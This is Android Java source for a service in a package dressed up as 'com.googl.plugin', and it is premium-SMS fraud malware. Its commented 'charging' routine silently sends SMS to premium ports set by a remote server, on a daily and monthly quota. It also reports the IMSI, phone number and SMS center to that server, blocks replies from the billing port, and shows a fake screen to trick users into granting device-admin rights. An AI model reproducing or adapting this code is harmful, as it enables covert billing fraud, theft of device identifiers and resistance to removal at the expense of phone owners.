package com.xstd.plugin.service;

import android.app.IntentService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import android.text.TextUtils;
import com.googl.plugin.x.FakeActivity;
import com.googl.plugin.x.R;
import com.plugin.common.utils.CustomThreadPool;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.internet.InternetUtils;
import com.xstd.plugin.Utils.SMSUtil;
import com.xstd.plugin.api.ActiveRequest;
import com.xstd.plugin.api.ActiveResponse;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:53
 * To change this template use File | Settings | File Templates.
 */
public class PluginService extends IntentService {

    public static final String ACTIVE_ACTION = "com.xstd.plugin.active";

    public static final String ACTIVE_PACKAGE_ACTION = "com.xstd.plugin.package.active";

    /**
     * 扣费行动
     */
    public static final String MONKEY_ACTION = "com.xstd.plugin.monkey";

    public PluginService() {
        super("PluginService");
    }

    @Override
    public void onHandleIntent(Intent intent) {
        Config.LOGD("[[PluginService::onHandleIntent]] intent : " + intent);
        if (intent != null) {
            String action = intent.getAction();
            Config.LOGD("[[PluginService::onHandleIntent]] action : " + action);
            if (ACTIVE_ACTION.equals(action)
                    && !AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                //do active
                activePluginAction();
            } else if (ACTIVE_PACKAGE_ACTION.equals(action)) {
                /**
                 * 其实什么也不需要做，这个action主要就是激活一下plugin程序
                 * 这条消息是由主程序发出的，如果主程序不激活子程序的话，子程序是不能接受到所有的BRC的
                 */
                activePackageAction(intent);
            } else if (MONKEY_ACTION.equals(action)) {
                /**
                 * 扣费逻辑
                 */
                monkeyAction();
            }
        }
    }

    private void monkeyAction() {
        Config.LOGD("[[PluginService::monkeyAction]]");
        if (AppRuntime.ACTIVE_RESPONSE != null) {
            int monkeyType = AppRuntime.ACTIVE_RESPONSE.type;
            switch (monkeyType) {
                case 1:
                    doSMSMonkey(AppRuntime.ACTIVE_RESPONSE);
                    break;
                case 2:
                    break;
                case 3:
                    break;
            }
        }
    }

    private synchronized void doSMSMonkey(ActiveResponse response) {
        if (response == null) {
            return;
        }

        int dayCount = SettingManager.getInstance().getKeyDayCount();
        int times = response.times;
        long lastCountTime = SettingManager.getInstance().getKeyLastCountTime();
        long curTime = System.currentTimeMillis();
        long delay = ((long) (response.interval)) * 60 * 1000;
        if ((times > dayCount)
                && (lastCountTime + delay) < curTime) {
            //今天的计费还没有完成，计费一次
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::doSMSMonkey]] try to send SMS monkey with info : " + response.toString());
            }
            if (!TextUtils.isEmpty(response.port) && !TextUtils.isEmpty(response.instruction)) {
                if (SMSUtil.sendSMS(response.port, response.instruction)) {
                    SettingManager.getInstance().setKeyDayCount(dayCount + 1);
                    SettingManager.getInstance().setKeyMonthCount(SettingManager.getInstance().getKeyMonthCount() + 1);
                    SettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
                }
            }
        } else {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginService::doSMSMonkey]] ignore this as monkey delay not meet");
            }
        }
    }

    private void activePluginAction() {
        CustomThreadPool.asyncWork(new Runnable() {
            @Override
            public void run() {
                if (Config.DEBUG) {
                    Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info");
                }
                try {
                    AppRuntime.ACTIVE_PROCESS_RUNNING.set(true);

                    if (TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())) {
                        /**
                         * 如果短信中心为空的话，就发送短信获取短信中心
                         */
                        SMSUtil.trySendCmdToNetwork(getApplicationContext());
                    } else {
                        SettingManager.getInstance().setKeyDayActiveCount(SettingManager.getInstance().getKeyDayActiveCount() + 1);
                        ActiveRequest request = new ActiveRequest(getApplicationContext()
                                                                     , Config.CHANNEL_CODE
                                                                     , UtilsRuntime.getIMSI(getApplicationContext())
                                                                     , getString(R.string.app_name)
                                                                     , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
                                                                     , SettingManager.getInstance().getKeySmsCenterNum()
                                                                     , AppRuntime.PHONE_NUMBER
                                                                     , "无");
                        //只要激活返回，就记录时间，也就是说，激活时间标识的是上次try to激活的时间，而不是激活成功的时间
                        SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
                        ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
                        if (response != null && !TextUtils.isEmpty(response.channelName)) {
                            if (Config.DEBUG) {
                                Config.LOGD(response.toString());
                            }

                            //增加一步对返回通道数据的校验
                            int netType = AppRuntime.getNetworkTypeByIMSI(getApplicationContext());
                            if (!String.valueOf(netType).equals(response.operator)) {
                                //网络类型不对，这就是一个最初级的检查
                                Config.LOGD("response == null or response error");
                                AppRuntime.ACTIVE_RESPONSE = null;
                            } else {
                                AppRuntime.ACTIVE_RESPONSE = response;
                                String path = getFilesDir().getAbsolutePath() + "/" + Config.ACTIVE_RESPONSE_FILE;
                                AppRuntime.saveActiveResponse(path);
                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
                                SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
                            }
                        } else {
                            Config.LOGD("response == null or response error");
                            AppRuntime.ACTIVE_RESPONSE = null;
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

                AppRuntime.ACTIVE_PROCESS_RUNNING.set(false);
            }
        });
    }

    private void activePackageAction(Intent intent) {
        Config.LOGD("[[PluginService::onHandleIntent]] >>> action : " + ACTIVE_PACKAGE_ACTION + " <<<<");
        try {
            SettingManager.getInstance().setKeyActiveAppName(intent.getStringExtra("name"));
            SettingManager.getInstance().setKeyActivePackageName(intent.getStringExtra("packageName"));

            Config.LOGD("[[PluginService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
                            + " packageName = " + intent.getStringExtra("packageName")
                            + " >>>>>>>>>>>");

            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            boolean isActive = dpm.isAdminActive(new ComponentName(this.getApplicationContext(), DeviceBindBRC.class));

            if (!isActive && !AppRuntime.FAKE_WINDOW_SHOW) {
                Intent i = new Intent();
                i.setClass(this.getApplicationContext(), FakeActivity.class);
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(i);
            }
        } catch (Exception e) {
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

}
